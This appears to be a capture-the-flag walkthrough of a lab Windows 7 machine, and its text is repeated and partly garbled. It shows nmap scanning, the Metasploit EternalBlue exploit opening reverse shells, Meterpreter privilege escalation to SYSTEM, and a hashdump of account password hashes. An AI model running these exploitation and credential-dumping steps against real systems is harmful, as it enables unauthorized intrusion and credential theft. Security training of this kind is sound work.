0 [System Process] 4 0 System x64 0 396 652 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM ## Task 1: 1. We use the usual nmap to scan the machine. Note that it says that the machine does not respond to ICMP requests. So, we have to use ```-Pn``` with nmap for scanning nmap -sC -sV -Pn -oN nmap-out 10.10.221.176\n The results: Nmap 7.80 scan initiated Wed Mar 25 10:26:26 2020 as: nmap -sC -sV -Pn -oN nmap.out 10.10.221.176 Nmap scan report for 10.10.221.176 Host is up (0.23s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2020-03-25T14:29:02+00:00; +1s from scanner time. 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\nHost script results: |_clock-skew: mean: 1h15m01s, deviation: 2h30m00s, median: 0s |_nbstat: NetBIOS name: JON-PC, NetBIOS user: , NetBIOS MAC: 02:d2:17:3d:b2:64 (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2020-03-25T09:28:55-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-25T14:28:55 |_ start_date: 2020-03-25T14:11:35\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done at Wed Mar 25 10:30:01 2020 \u0026ndash; 1 IP address (1 host up) scanned in 215.17 seconds\n 2. We find 3 ports with port number under 1000: * 135 * 139 * 445 3. We see that the machine is running Windows \u0026amp; SP 1. We look for exploits for this OS on google, and one that mostly comes up is the vulnerability ms17-010. # Task 2: Gain access 1. We start metasploit msfconsole [-] ***rting the Metasploit Framework console\u0026hellip;\n[-] * WARNING: No database support: No database YAML file [-] ***\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMM MMMN$ vMMMM MMMNl MMMMM MMMMM JMMMM MMMNl MMMMMMMN NMMMMMMM JMMMM MMMNl MMMMMMMMMNmmmNMMMMMMMMM JMMMM MMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM MMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM MMMNI MMMMM MMMMMMM MMMMM jMMMM MMMNI MMMMM MMMMMMM MMMMM jMMMM MMMNI MMMNM MMMMMMM MMMMM jMMMM MMMNI WMMMM MMMMMMM MMMM# JMMMM MMMMR ?MMNM MMMMM .dMMMM MMMMNm ?MMM MMMM dMMMMM MMMMMMN ?MM MM? NMMMMMN MMMMMMMMNe JMMMMMNMMM MMMMMMMMMMNm, eMMMMMNMMNMM MMMMNNMNMMMMMNx MMMMMMNMMNMMNM MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM https://metasploit.com\n =[ metasploit v5.0.60-dev ]   \u0026ndash; \u0026ndash;=[ 1947 exploits - 1089 auxiliary - 333 post ] \u0026ndash; \u0026ndash;=[ 556 payloads - 45 encoders - 10 nops ] \u0026ndash; \u0026ndash;=[ 7 evasion ]   2. We search for exploits for the vulnerability ms17-010: msf5 \u0026gt; search ms17-010\nMatching Modules Name Disclosure Date Rank Check Description\n  ----- -----------  0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 1 auxiliary/scanner/smb/smb_ms17_010 normal Yes MS17-010 SMB RCE Detection 2 exploit/windows/smb/doublepulsar_rce 2017-04-14 great Yes DOUBLEPULSAR Payload Execution and Neutralization 3 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 4 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 5 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n Here, we will use the exploit ```exploit/windows/smb/ms17_010_eternalblue```. msf5 \u0026gt; use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt;\n## Info: Description: This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads. References: https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010 https://cvedetails.com/cve/CVE-2017-0143/ https://cvedetails.com/cve/CVE-2017-0144/ https://cvedetails.com/cve/CVE-2017-0145/ https://cvedetails.com/cve/CVE-2017-0146/ https://cvedetails.com/cve/CVE-2017-0147/ https://cvedetails.com/cve/CVE-2017-0148/ https://github.com/RiskSense-Ops/MS17-010 3. We check the options for this exploit: msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; options\nModule options (exploit/windows/smb/ms17_010_eternalblue):\nName Current Setting Required Description\n RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026lsquo;file:\u0026rsquo; RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target.\nExploit target:\nId Name\n 0 Windows 7 and Server 2008 R2 (x64) All Service Packs\n We see that we have to set out RHOSTS whick will be our target machine.So, we set RHOST with the ip address of the windows machine from the site: msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set RHOSTS 10.10.221.176 RHOSTS =\u0026gt; 10.10.221.176\n 4. We run the exploit. msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run\n[] Started reverse TCP handler on 10.8.30.133:4444 [+] 10.10.247.170:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [] 10.10.247.170:445 - Connecting to target for exploitation. [+] 10.10.247.170:445 - Connection established for exploitation. [+] 10.10.247.170:445 - Target OS selected valid for OS indicated by SMB reply [] 10.10.247.170:445 - CORE raw buffer dump (42 bytes) [] 10.10.247.170:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [] 10.10.247.170:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [] 10.10.247.170:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.247.170:445 - Target arch selected valid for arch indicated by DCE/RPC reply [] 10.10.247.170:445 - Trying exploit with 12 Groom Allocations. [] 10.10.247.170:445 - Sending all but last fragment of exploit packet [] 10.10.247.170:445 - Starting non-paged pool grooming [+] 10.10.247.170:445 - Sending SMBv2 buffers [+] 10.10.247.170:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [] 10.10.247.170:445 - Sending final SMBv2 buffers. [] 10.10.247.170:445 - Sending last fragment of exploit packet! [] 10.10.247.170:445 - Receiving response from exploit packet [+] 10.10.247.170:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [] 10.10.247.170:445 - Sending egg to corrupted connection. [] 10.10.247.170:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184) at 2020-03-25 15:17:21 -0400 [+] 10.10.247.170:445\n =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.247.170:445 =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.247.170:445 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=  Copyright (c) 2009 Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32\u0026gt;\n Voila! we got a shell! 5. We background the shell using Ctrl+z ## Task 3: Escalate 1. In order to convert the shell to a meterpreter shell, we use the following exploit: msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; use post/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) \u0026gt;\n 2. We check the options for this exploit: msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; options\nModule options (post/multi/manage/shell_to_meterpreter):\nName Current Setting Required Description\n HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on.\n So the option that we are required to change is ```SESSION``` 3. In order to ser the option session we need the session id of our previously opened shell. To find the session id, we enter the command ```sessions -l``` msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions -l\nActive sessions Id Name Type Information Connection\n 1 shell x64/windows Microsoft Windows [Version 6.1.7601] 10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184 (10.10.247.170)\n So, the session id is 1. We set the session msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set SESSION 1 SESSION =\u0026gt; 1\n 4. We run the exploit. msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run\n[] Upgrading session ID: 1 [] Starting exploit/multi/handler [] Started reverse TCP handler on 10.8.30.133:4433 [] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; [] Sending stage (180291 bytes) to 10.10.247.170 [] Meterpreter session 2 opened (10.8.30.133:4433 -\u0026gt; 10.10.247.170:49193) at 2020-03-25 15:24:05 -0400 [*] Stopping exploit/multi/handler\nmsf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions\nActive sessions Id Name Type Information Connection\n 1 shell x64/windows Microsoft Windows [Version 6.1.7601] 10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184 (10.10.247.170) 2 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.8.30.133:4433 -\u0026gt; 10.10.247.170:49193 (10.10.247.170)\n We see that we got a meterpreter shell! 5. We can interact with th meterpreter shell using the following command: msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions -i 2 [*] Starting interaction with 2\u0026hellip;\nmeterpreter \u0026gt;\n 6. We run getsystem, shell and whoami to check if we have escalated to NT AUTHORITY\\SYSTEM meterpreter \u0026gt; getsystem \u0026hellip;got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter \u0026gt; shell Process 2216 created. Channel 1 created. Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system\nCk 1:\n We use the usual nmap to scan the machine. Note that it says that the machine does not respond to ICMP requests. So, we have to use -Pn with nmap for scanning  nmap -sC -sV -Pn -oN nmap-out 10.10.221.176 The results:\n# Nmap 7.80 scan initiated Wed Mar 25 10:26:26 2020 as: nmap -sC -sV -Pn -oN nmap.out 10.10.221.176 Nmap scan report for 10.10.221.176 Host is up (0.23s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2020-03-25T14:29:02+00:00; +1s from scanner time. 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h15m01s, deviation: 2h30m00s, median: 0s |_nbstat: NetBIOS name: JON-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:d2:17:3d:b2:64 (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2020-03-25T09:28:55-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-25T14:28:55 |_ start_date: 2020-03-25T14:11:35 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Mar 25 10:30:01 2020 -- 1 IP address (1 host up) scanned in 215.17 seconds We find 3 ports with port number under 1000:   135 139 445  We see that the machine is running Windows \u0026amp; SP 1. We look for exploits for this OS on google, and one that mostly comes up is the vulnerability ms17-010.  Task 2: Gain access  We start metasploit  msfconsole [-] ***rting the Metasploit Framework console...\\ [-] * WARNING: No database support: No database YAML file [-] *** MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMM MMMN$ vMMMM MMMNl MMMMM MMMMM JMMMM MMMNl MMMMMMMN NMMMMMMM JMMMM MMMNl MMMMMMMMMNmmmNMMMMMMMMM JMMMM MMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM MMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM MMMNI MMMMM MMMMMMM MMMMM jMMMM MMMNI MMMMM MMMMMMM MMMMM jMMMM MMMNI MMMNM MMMMMMM MMMMM jMMMM MMMNI WMMMM MMMMMMM MMMM# JMMMM MMMMR ?MMNM MMMMM .dMMMM MMMMNm `?MMM MMMM` dMMMMM MMMMMMN ?MM MM? NMMMMMN MMMMMMMMNe JMMMMMNMMM MMMMMMMMMMNm, eMMMMMNMMNMM MMMMNNMNMMMMMNx MMMMMMNMMNMMNM MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM https://metasploit.com =[ metasploit v5.0.60-dev ] + -- --=[ 1947 exploits - 1089 auxiliary - 333 post ] + -- --=[ 556 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] We search for exploits for the vulnerability ms17-010:  msf5 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 1 auxiliary/scanner/smb/smb_ms17_010 normal Yes MS17-010 SMB RCE Detection 2 exploit/windows/smb/doublepulsar_rce 2017-04-14 great Yes DOUBLEPULSAR Payload Execution and Neutralization 3 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 4 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 5 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution Here, we will use the exploit exploit/windows/smb/ms17_010_eternalblue.\nmsf5 \u0026gt; use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; Info: Description: This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads.\nReferences: https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010 https://cvedetails.com/cve/CVE-2017-0143/ https://cvedetails.com/cve/CVE-2017-0144/ https://cvedetails.com/cve/CVE-2017-0145/ https://cvedetails.com/cve/CVE-2017-0146/ https://cvedetails.com/cve/CVE-2017-0147/ https://cvedetails.com/cve/CVE-2017-0148/ https://github.com/RiskSense-Ops/MS17-010\nWe check the options for this exploit:  msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs We see that we have to set out RHOSTS whick will be our target machine.So, we set RHOST with the ip address of the windows machine from the site:\nmsf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set RHOSTS 10.10.221.176 RHOSTS =\u0026gt; 10.10.221.176 We run the exploit.  msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run [*] Started reverse TCP handler on 10.8.30.133:4444 [+] 10.10.247.170:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.247.170:445 - Connecting to target for exploitation. [+] 10.10.247.170:445 - Connection established for exploitation. [+] 10.10.247.170:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.247.170:445 - CORE raw buffer dump (42 bytes) [*] 10.10.247.170:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.247.170:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.247.170:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.247.170:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.247.170:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.247.170:445 - Sending all but last fragment of exploit packet [*] 10.10.247.170:445 - Starting non-paged pool grooming [+] 10.10.247.170:445 - Sending SMBv2 buffers [+] 10.10.247.170:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.247.170:445 - Sending final SMBv2 buffers. [*] 10.10.247.170:445 - Sending last fragment of exploit packet! [*] 10.10.247.170:445 - Receiving response from exploit packet [+] 10.10.247.170:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.247.170:445 - Sending egg to corrupted connection. [*] 10.10.247.170:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184) at 2020-03-25 15:17:21 -0400 [+] 10.10.247.170:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.247.170:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.247.170:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; Voila! we got a shell!\nWe background the shell using Ctrl+z  Task 3: Escalate  In order to convert the shell to a meterpreter shell, we use the following exploit:  msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; use post/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; We check the options for this exploit:  msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. So the option that we are required to change is SESSION\nIn order to ser the option session we need the session id of our previously opened shell. To find the session id, we enter the command sessions -l  msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions -l Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] 10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184 (10.10.247.170) So, the session id is 1. We set the session\nmsf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set SESSION 1 SESSION =\u0026gt; 1 We run the exploit.  msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.8.30.133:4433 [*] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; [*] Sending stage (180291 bytes) to 10.10.247.170 [*] Meterpreter session 2 opened (10.8.30.133:4433 -\u0026gt; 10.10.247.170:49193) at 2020-03-25 15:24:05 -0400 [*] Stopping exploit/multi/handler msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] 10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184 (10.10.247.170) 2 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.8.30.133:4433 -\u0026gt; 10.10.247.170:49193 (10.10.247.170) We see that we got a meterpreter shell!\nWe can interact with th meterpreter shell using the following command:  msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions -i 2 [*] Starting interaction with 2... meterpreter \u0026gt; We run getsystem, shell and whoami to check if we have escalated to NT AUTHORITY\\SYSTEM  meterpreter \u0026gt; getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter \u0026gt; shell Process 2216 created. Channel 1 created. Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt; So, we are in fact system!\nWe enter the command ps to view the running processes  C:\\Windows\\system32\u0026gt;^Z Background channel 1? [y/N] y meterpreter \u0026gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 396 652 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\LogonUI.exe 416 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\smss.exe 428 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 536 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 552 544 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 600 544 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wininit.exe 612 592 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 652 592 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\winlogon.exe 700 600 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\services.exe 708 600 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsass.exe 716 600 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsm.exe 824 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 892 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 940 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1012 824 WmiPrvSE.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\wbem\\WmiPrvSE.exe 1068 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1160 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 1292 700 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1328 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1380 2856 powershell.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 1392 700 amazon-ssm-agent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe 1468 700 LiteAgent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Xentools\\LiteAgent.exe 1588 700 Ec2Config.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe 1780 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 1856 2200 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe 1936 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 1940 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 2144 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 2200 700 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe 2216 2504 cmd.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\SysWOW64\\cmd.exe 2328 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 2360 700 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\sppsvc.exe 2428 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 2504 1380 powershell.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe 2560 700 vds.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\vds.exe 2664 700 SearchIndexer.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\SearchIndexer.exe 2796 1292 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\cmd.exe 3020 700 TrustedInstaller.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\servicing\\TrustedInstaller.exe We write down the process id 2796.\nWe migrate to the process whose id we noted:  meterpreter \u0026gt; migrate 2796 [*] Migrating from 2504 to 2796... [*] Migration completed successfully. Task 4: Cracking  We run the command hashdump.  meterpreter \u0026gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: So the user is Jon.\nWindows uses LM and NTLM hashing. We crack the hashes using hashcat  Task 5: Find flags!    meterpreter \u0026gt; cd C:\\\\ meterpreter \u0026gt; ls Listing: C:\\ ============ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2009-07-13 23:18:56 -0400 $Recycle.Bin 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Documents and Settings 40777/rwxrwxrwx 0 dir 2009-07-13 23:20:08 -0400 PerfLogs 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files (x86) 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:08 -0400 ProgramData 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:22 -0500 Recovery 40777/rwxrwxrwx 4096 dir 2018-12-12 18:01:17 -0500 System Volume Information 